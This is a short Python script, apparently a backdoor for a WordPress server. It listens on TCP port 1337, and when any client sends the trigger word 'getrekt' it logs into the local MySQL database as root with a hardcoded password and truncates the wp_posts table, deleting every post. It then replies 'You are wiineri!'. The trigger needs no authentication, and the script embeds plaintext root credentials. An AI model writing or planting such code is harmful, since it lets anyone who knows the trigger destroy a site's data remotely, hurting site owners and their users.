import MySQLdb
import socket
import sys

host = sys.argv[1]
port = 1337
win_msg = "You are wiineri!"

def truncate():
    db = MySQLdb.connect(host="localhost",
                         user="root",
                         passwd="root66",
                         db="wordpress")

    cur = db.cursor()

    cur.execute("TRUNCATE TABLE wp_posts")

    db.close()


if __name__ == "__main__":
    s = socket.socket()
    s.bind((host, port))
    s.listen(5)

    while True:
        conn, addr = s.accept()
        if "getrekt" in str(conn.recv(1024), "latin-1"):
            truncate()
            conn.sendall(bytes(win_msg, "latin-1"))
